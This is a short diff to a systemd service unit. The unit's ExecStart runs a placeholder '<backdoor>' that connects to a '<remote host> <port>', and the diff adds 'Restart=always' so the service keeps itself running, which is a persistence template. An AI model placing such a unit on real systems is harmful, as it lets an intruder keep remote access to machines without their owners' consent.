@@ -3,6 +3,7 @@ Description=<description>
 
 [Service]
 ExecStart=<backdoor> <remote host> <port>
+Restart=always
 
 [Install]
 WantedBy=default.target
